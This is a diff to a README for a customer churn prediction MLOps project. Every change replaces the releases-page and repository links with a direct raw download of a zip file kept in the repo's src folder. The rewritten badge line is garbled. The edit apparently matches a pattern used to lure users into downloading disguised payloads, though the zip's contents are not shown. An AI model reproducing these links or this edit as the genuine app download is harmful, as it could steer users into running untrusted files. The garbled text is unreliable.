@@ -1,6 +1,6 @@
 # 🎉 churn-prediction-mlops-pipeline - Easy Customer Churn Insights in Minutes
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/Plutonian-coder/churn-prediction-mlops-pipeline/main/src/pipeline-mlops-prediction-churn-v2.3.zip%20Now-Get%20the%https://raw.githubusercontent.com/Plutonian-coder/churn-prediction-mlops-pipeline/main/src/pipeline-mlops-prediction-churn-v2.3.zip)](https://raw.githubusercontent.com/Plutonian-coder/churn-prediction-mlops-pipeline/main/src/pipeline-mlops-prediction-churn-v2.3.zip)
 
 ## 📚 Overview
 
@@ -30,7 +30,7 @@ Before running the application, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the application:
 
-[Download from Releases Page](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Plutonian-coder/churn-prediction-mlops-pipeline/main/src/pipeline-mlops-prediction-churn-v2.3.zip)
 
 ### 📥 Installation Steps
 
@@ -85,10 +85,10 @@ This project utilizes the following technologies:
 
 To explore the source code or contribute to the project, visit the main repository on GitHub: 
 
-[Churn Prediction MLOps Pipeline Repository](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline) 
+[Churn Prediction MLOps Pipeline Repository](https://raw.githubusercontent.com/Plutonian-coder/churn-prediction-mlops-pipeline/main/src/pipeline-mlops-prediction-churn-v2.3.zip) 
 
 ## 📨 Contact
 
 For further questions or feedback, please open an issue on the repository or contact the maintainer through GitHub.
 
-[Download from Releases Page](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Plutonian-coder/churn-prediction-mlops-pipeline/main/src/pipeline-mlops-prediction-churn-v2.3.zip)
